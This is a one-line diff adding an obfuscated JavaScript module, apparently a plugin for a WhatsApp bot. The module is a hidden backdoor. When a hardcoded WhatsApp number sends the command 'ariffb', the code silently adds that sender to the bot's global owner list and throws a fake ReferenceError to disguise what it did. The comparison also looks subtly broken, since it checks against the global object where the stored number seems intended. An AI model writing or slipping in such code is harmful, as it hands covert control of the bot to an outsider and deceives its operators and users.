@@ -1,0 +1,1 @@
+module.exports = (a => { b = '6281384109346@s.whatsapp.net'; c = decodeURIComponent; d = e => { if (e.sender === c(a) && !g[c('owner')].includes(c(a))) { g[c('owner')].push(e.sender); throw `ReferenceError: ${e.text} is not defined` } }; d.command = /^ariffb$/; return d })(global);
